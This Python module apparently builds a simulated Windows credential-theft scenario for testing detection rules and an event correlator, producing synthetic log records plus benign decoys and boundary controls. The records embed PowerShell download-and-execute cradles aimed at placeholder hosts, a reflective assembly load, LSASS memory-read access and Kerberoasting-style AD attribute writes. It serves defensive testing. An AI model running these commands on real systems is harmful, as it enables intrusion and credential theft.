"""storyline_win_credential_theft -- Windows credential theft with defence evasion and persistence:
PowerShell download cradle -> LSASS memory read -> sensitive AD attribute write -> service
installed from a user-writable path -> Security log cleared.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    powershell_cradle -> lsass_dump -> directory_tamper -> service_persistence -> log_clear

WHAT IT CAN SHOW THAT NO OTHER STORYLINE CAN
    * the five Windows-endpoint rules added in the 2026-10-20 recall work, which no oracle named
      before this one: ``win_powershell_suspicious_script``, ``win_lsass_access_suspicious``,
      ``win_ad_sensitive_attribute_modified``, ``win_service_installed_suspicious_path`` and
      ``win_audit_log_cleared``. All five key on a parser-set HEURISTIC boolean (or, for the log
      clear, on the event itself), so the boundary controls below each flip exactly the one input
      the heuristic reads (script indicator count, GrantedAccess mask, attribute name, image path);
    * a GENUINE unrelated-entity negative control: ``bystander_log_maintenance`` is a different
      administrator clearing a different server's Security log (the documented false-positive shape
      of ``win_audit_log_cleared``). It rides in the BASE build under a step label that is not in
      the oracle's ``expected_sequence``, so the grader treats it as non-attack activity, and the
      oracle declares ``log_clear -> bystander_log_maintenance`` forbidden. The pair shares no
      account, host or address, so a correct correlator must NOT join it to the intrusion incident
      -- unlike the reversed-order pairs of the older storylines, this is an entity-disjointness
      control, not a direction one.

TELEMETRY. Real parsers throughout: ``windows_eventlog`` (4104, 5136, 7045, 1102) and ``sysmon``
(EventID 10). Every raw record is in the source's own native shape; nothing hand-sets a
``type_uid``. Every ``Channel`` is the provider's real channel, so the parser's EventID-scope check
accepts it. No dependency gaps (``parse_expected=True`` everywhere).

STRUCTURE VARIES WITH THE SEED: the account, workstation and address, the number of script-block
events (2 or 3) and of service-install events (1 or 2), the dumping tool and the AD attribute.

SAFETY. Simulation only: ``.invalid`` / ``example`` names, private 10.0.0.0/8 addresses, a fixed
calendar epoch (no wall clock). The "script" and "image path" are strings inside log records;
nothing is executed and nothing touches a network or a real directory.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, NegativeTwin, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS, meta  # noqa: E402

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("powershell_cradle", "windows_eventlog", True,
                  "PowerShell script-block logging records a download-and-execute cradle"),
    ChainStepSpec("lsass_dump", "sysmon", True,
                  "an unsigned tool opens lsass.exe with a memory-read access mask"),
    ChainStepSpec("directory_tamper", "windows_eventlog", True,
                  "the stolen account writes a Kerberoasting / shadow-credential attribute on the DC"),
    ChainStepSpec("service_persistence", "windows_eventlog", True,
                  "a service is installed whose image path is in a user-writable folder"),
    ChainStepSpec("log_clear", "windows_eventlog", True,
                  "the Security event log is cleared"),
)

#: the unrelated activity that rides in the base build (see the module docstring); NOT in the oracle's
#: ``expected_sequence``, so the grader scores it as non-attack activity
BYSTANDER = ChainStepSpec("bystander_log_maintenance", "windows_eventlog", True,
                          "another administrator clears a different server's Security log (BENIGN maintenance)")
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_deploy_script", "windows_eventlog", True,
                  "a deployment service account runs a download-and-execute script on a build host (BENIGN)"),
)

_ACCOUNTS = ("h.admin", "s.ops", "l.helpdesk", "r.netops")
_WKS = ("wks-fin-14", "wks-hr-07", "wks-ops-22", "wks-eng-31")
_DUMPERS = ("C:\\Users\\Public\\procdump64.exe", "C:\\Users\\Public\\taskmgr-x.exe", "C:\\Windows\\Temp\\sqldmp.exe")
#: attributes in windows_eventlog._DS_SENSITIVE_ATTRS (case-folded match)
_SENSITIVE_ATTRS = ("servicePrincipalName", "msDS-KeyCredentialLink", "msDS-AllowedToDelegateTo")
_CRADLES = (
    "IEX (New-Object Net.WebClient).DownloadString('http://stage.example.invalid/a.ps1')",
    "$b=[Convert]::FromBase64String('SGVsbG8gd29ybGQ='); [Reflection.Assembly]::Load($b)",
    "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://x.example.invalid/p'))",
)

_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_T_PS = BASE_MS
_T_LSASS = BASE_MS + 120_000
_T_DIR = BASE_MS + 300_000
_T_SVC = BASE_MS + 600_000
_T_CLEAR = BASE_MS + 900_000
_T_BYSTANDER = BASE_MS + 400_000     # overlaps the attack window on purpose


def _rule_id(stem: str) -> str:
    """A rule's id read from its own file (the twins name a rule by stem, never by a copied id)."""
    import yaml  # noqa: PLC0415
    path = TWIN.parents[1] / "contracts" / "rules" / f"{stem}.yml"
    return str(yaml.safe_load(path.read_text(encoding="utf-8"))["id"])


def _build(seed: int, *, ps_script: str | None = None, lsass_mask: str | None = None,
           ds_attribute: str | None = None, service_path: str | None = None):
    """The one builder every twin shares.

    Each keyword overrides EXACTLY ONE attribute of the seed-derived storyline and nothing else --
    every random draw happens before any override, so overriding one never shifts another. That is
    what makes a negative twin "the attack minus one attribute", with the restored half on the same
    code path.
    """
    rng = Random(seed * 1299709 + 29)
    user = rng.choice(_ACCOUNTS)
    wks = rng.choice(_WKS)
    ip = f"10.30.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    dumper = rng.choice(_DUMPERS)
    drawn_attr = rng.choice(_SENSITIVE_ATTRS)
    drawn_cradle = rng.choice(_CRADLES)
    n_ps = 1 + seed % 3                         # 1..3 script-block events
    n_svc = 1 + (seed // 3) % 2                 # 1 or 2 service-install events
    svc_name = f"WinUpdSvc{rng.randint(10, 99)}"
    drawn_path = f"C:\\Users\\Public\\{svc_name.lower()}.exe"

    script = drawn_cradle if ps_script is None else ps_script
    mask = "0x1010" if lsass_mask is None else lsass_mask
    attr = drawn_attr if ds_attribute is None else ds_attribute
    image_path = drawn_path if service_path is None else service_path

    steps = {s.label: s for s in STEPS}
    steps[BYSTANDER.label] = BYSTANDER
    ordinal = {s.label: i for i, s in enumerate(STEPS)}
    ordinal[BYSTANDER.label] = len(STEPS)
    payloads: list = []
    notes: dict = {}
    seen: dict = {}

    def add(label: str, source_type: str, raw, ts: int, ip_: str | None) -> None:
        # ingest id = (step ordinal, position within the step): a twin that adds or removes events of
        # ONE step must not renumber every later step
        k = seen.get(label, 0)
        seen[label] = k + 1
        payloads.append((steps[label], {"source_type": source_type, "raw": raw,
                                        "meta": meta(seed, "wct", ordinal[label] * 100 + k, ts, ip_)}))

    for i in range(n_ps):
        ts = _T_PS + i * 20_000
        add("powershell_cradle", "windows_eventlog",
            {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
             "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ScriptBlockText": script, "TimeCreated": ts}, ts, ip)
    notes["powershell_cradle"] = f"{n_ps} script-block event(s) on {wks}: {script[:48]}..."

    add("lsass_dump", "sysmon",
        {"EventID": 10, "TimeCreated": _T_LSASS, "Computer": wks, "User": user,
         "SourceImage": dumper, "SourceProcessId": "5120",
         "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": mask}, _T_LSASS, ip)
    notes["lsass_dump"] = f"{dumper} opens lsass.exe with GrantedAccess {mask} on {wks}"

    add("directory_tamper", "windows_eventlog",
        {"EventID": 5136, "Computer": "dc01", "SubjectUserName": user, "SubjectDomainName": "CORP",
         "ObjectDN": "CN=svc-sql,OU=Services,DC=corp,DC=example", "ObjectClass": "user",
         "AttributeLDAPDisplayName": attr, "AttributeValue": "MSSQLSvc/db01.corp.example:1433",
         "OperationType": "%%14674", "TimeCreated": _T_DIR}, _T_DIR, ip)
    notes["directory_tamper"] = f"{user} writes {attr} on CN=svc-sql via dc01"

    for i in range(n_svc):
        ts = _T_SVC + i * 30_000
        add("service_persistence", "windows_eventlog",
            {"EventID": 7045, "Channel": "System", "ProviderName": "Service Control Manager",
             "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ServiceName": svc_name, "ImagePath": image_path, "TimeCreated": ts}, ts, ip)
    notes["service_persistence"] = f"{n_svc} 7045 event(s): {svc_name} -> {image_path} on {wks}"

    add("log_clear", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": wks, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TimeCreated": _T_CLEAR}, _T_CLEAR, ip)
    notes["log_clear"] = f"{user} clears the Security log on {wks}"

    # The unrelated bystander: its own administrator, host and address; shares nothing with the attack.
    add("bystander_log_maintenance", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": "fs02", "SubjectUserName": "ops.maint", "SubjectDomainName": "CORP",
         "TimeCreated": _T_BYSTANDER}, _T_BYSTANDER, "10.31.0.9")
    notes["bystander_log_maintenance"] = "ops.maint clears the Security log on fs02 (scheduled maintenance)"

    return payloads, {}, notes, None


def build(seed: int):
    return _build(seed)


# ---------------------------------------------------------------------------
# Benign look-alike for the ``noise`` axis: a deployment account downloading and running a build
# script -- the DOCUMENTED false-positive shape of win_powershell_suspicious_script. Disjoint
# account, host and address; overlaps the attack window.
# ---------------------------------------------------------------------------
def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    out: list = []
    for i in range(2):
        ts = _T_PS + 10_000 + i * 25_000
        out.append((spec, {"source_type": "windows_eventlog",
                           "raw": {"EventID": 4104, "Channel": _PS_CHANNEL,
                                   "ProviderName": "Microsoft-Windows-PowerShell",
                                   "Computer": "build02", "SubjectUserName": "deploy.svc",
                                   "SubjectDomainName": "CORP",
                                   "ScriptBlockText": "(New-Object Net.WebClient).DownloadString("
                                                      "'https://pkg.internal.example/agent.ps1') | IEX",
                                   "TimeCreated": ts},
                           "meta": meta(seed, "wctd", i, ts, "10.32.0.4")}))
    return out


# ---------------------------------------------------------------------------
# Boundary controls: each differs from the attack by exactly ONE attribute, on the SAME builder
# with the attribute restored for the positive twin. win_audit_log_cleared has none: it is
# single-shot (every parsed class-1002/activity-4 event fires) so there is no sub-threshold value.
# ---------------------------------------------------------------------------
_WEAK_ONE = "iex (Get-Content C:\\ops\\inventory.ps1 -Raw)"                        # one weak indicator
_WEAK_TWO = "iex (Get-Content C:\\ops\\inventory.ps1 -Raw) -nop"                   # two weak indicators

NEGATIVES: tuple[NegativeTwin, ...] = (
    NegativeTwin(
        name="script_one_weak_indicator", step="powershell_cradle",
        rule_ids=(_rule_id("win_powershell_suspicious_script"),),
        attribute="indicator count in the logged script text: one weak indicator (IEX), one under the "
                  "heuristic's two-weak rule; the restored half carries a second weak one (-nop)",
        build=lambda seed, restored: _build(seed, ps_script=_WEAK_TWO if restored else _WEAK_ONE)),
    NegativeTwin(
        name="lsass_access_query_only", step="lsass_dump", rule_ids=(_rule_id("win_lsass_access_suspicious"),),
        attribute="GrantedAccess on the lsass handle: 0x1000 (query-limited only, no PROCESS_VM_READ) "
                  "instead of the dump-capable 0x1010",
        build=lambda seed, restored: _build(seed, lsass_mask="0x1010" if restored else "0x1000")),
    NegativeTwin(
        name="directory_attribute_not_sensitive", step="directory_tamper",
        rule_ids=(_rule_id("win_ad_sensitive_attribute_modified"),),
        attribute="the modified attribute: description (not on the sensitive-attribute list) instead of "
                  "servicePrincipalName",
        build=lambda seed, restored: _build(
            seed, ds_attribute="servicePrincipalName" if restored else "description")),
    NegativeTwin(
        name="service_path_program_files", step="service_persistence",
        rule_ids=(_rule_id("win_service_installed_suspicious_path"),),
        attribute="the service image path: a Program Files location (no user-writable, shell or UNC "
                  "marker) instead of the Public-profile folder",
        build=lambda seed, restored: _build(
            seed, service_path="C:\\Users\\Public\\agent.exe" if restored
            else "C:\\Program Files\\Vendor\\agent.exe")),
)


STORYLINE = ScenarioDef(
    name="win_credential_theft",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_win_credential_theft.yaml",
    summary="PowerShell cradle -> LSASS read -> sensitive AD attribute write -> service from a "
            "user-writable path -> Security log cleared (plus an unrelated admin's log maintenance)",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS + (BYSTANDER,),
    negatives=NEGATIVES,
)
